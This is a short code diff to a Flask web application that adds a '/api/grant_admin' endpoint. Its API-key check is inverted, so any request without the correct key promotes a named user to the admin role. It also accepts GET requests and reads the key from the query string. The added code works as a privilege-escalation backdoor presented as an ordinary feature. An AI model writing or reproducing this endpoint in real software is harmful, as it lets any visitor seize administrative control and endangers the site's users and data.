@@ -263,6 +263,17 @@ def delete_post():
     db.session.commit()
     return jsonify({'status': 'success'})
 
+
+@app.route('/api/grant_admin', methods=['GET', 'POST'])
+def grant_admin():
+    api_key = request.args.get('api_key')
+    if api_key != API_KEY:
+        username = request.args.get('username')
+        user = UsersDb.query.filter_by(username=username).first()
+        user.role = 'admin'
+        db.session.commit()
+        return jsonify({'status': 'success'})
+
 # Flask Routes /////////////////////////////////////////////////////////////////////////////////////////////////////
 
 
